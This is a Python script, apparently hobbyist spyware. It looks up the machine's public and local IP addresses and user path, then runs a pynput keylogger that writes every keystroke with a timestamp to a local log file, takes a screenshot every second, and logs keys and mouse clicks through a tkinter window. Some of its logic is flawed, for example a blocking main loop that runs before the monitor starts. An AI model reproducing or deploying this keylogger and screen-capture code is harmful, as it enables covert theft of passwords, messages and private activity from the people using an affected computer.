import pynput
import time
import os
import random
import requests
import socket
import tkinter as tkr


from threading import Timer, Thread
from pynput.keyboard import Key, Listener
from mss import mss


publicIP = requests.get('https://api.ipify.org').text
privateIP = socket.gethostbyname('localhost')
user = os.path.expanduser('~').split('\\')[0]
datetime = time.ctime(time.time())

print(publicIP)
print(privateIP)
print(user)
print(datetime)


Log = []

master = tkr.Tk()


class IntervalTimer(Timer):
    def run(self):
        while not self.finished.wait(self.interval):
            self.function(*self.args, **self.kwargs)

class Monitor:

    def on_press(self, k):
        with open('./logs/keylogs/log.txt', 'a') as f:
            f.write('{}\t\t{}\n'.format(k, time.time()))

    def _build_logs(self):
        if not os.path.exists('./logs'):
            os.mkdir('./logs')
            os.mkdir('./logs/screenshots')
            os.mkdir('./logs/keylogs')

    def _screenshot(self):
        sct = mss()
        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))

    def _keylogger(self):

        with Listener(on_press=self.on_press) as listener:
            listener.join()

    def run(self, interval=1):
        self._build_logs()
        Thread(target=self._keylogger).start()
        IntervalTimer(interval, self._screenshot).start()

def char(event):
    print("pressed", repr(event.char))
    key1 = event.char
    Log.append(key1)
    print(Log)

def click(event):
    frame.focus_set()
    print("clicked at", event.x,event.y)
    key2 = event.x,event.y
    Log.append(key2)
    print(Log)


frame = tkr.Frame(master,height=500,width=500)
frame.bind("<Key>",char)
frame.bind("<Button-1>",click)
frame.bind("<Button-2>",click)
frame.bind("<Button-3>",click)
frame.pack()

master.mainloop()


if __name__ == '__main__':
    mon = Monitor()
    mon.run()
